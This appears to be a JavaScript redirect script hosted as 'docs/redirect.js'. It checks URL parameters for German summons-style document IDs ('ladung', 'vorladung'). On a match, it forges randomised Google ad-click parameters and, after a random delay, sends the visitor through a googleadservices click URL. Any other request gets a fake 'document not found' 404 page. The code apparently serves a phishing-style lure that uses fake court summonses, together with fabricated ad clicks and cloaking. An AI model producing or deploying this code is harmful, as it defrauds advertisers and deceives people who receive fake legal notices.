// docs/redirect.js
document.addEventListener('DOMContentLoaded', function() {
  // 
  const urlParams = new URLSearchParams(window.location.search);
  const docType = urlParams.get('type'); // 'ladung' или 'vorladung'
  const docId = urlParams.get('id');     // например 'L-40822'
  
  // 
  const validDocs = {
    ladung: ['L-40822', 'L-55199', 'L-77301'],
    vorladung: ['V-11245', 'V-88903']
  };

  // 
  if (validDocs[docType]?.includes(docId)) {
    // 
    const adParams = generateAdParams();
    
    // 
    const targetUrl = `https://www.googleadservices.com/pagead/aclk?${adParams}&adurl=https://google.com`;
    
    // 
    setTimeout(() => {
      window.location.href = targetUrl;
    }, 3000 + Math.random() * 2000);
  } else {
    document.getElementById('content').innerHTML = `
      <h1>Dokument nicht gefunden</h1>
      <p>Fehler 404: Das angeforderte Dokument existiert nicht.</p>
    `;
  }
});

function generateAdParams() {
  // 
  const params = {
    sa: 'L',
    ai: Math.random().toString(36).substring(2, 12),
    nx: Math.floor(Math.random() * 1000),
    ny: Math.floor(Math.random() * 1000),
    nb: Math.floor(Math.random() * 10)
  };
  return new URLSearchParams(params).toString();
}
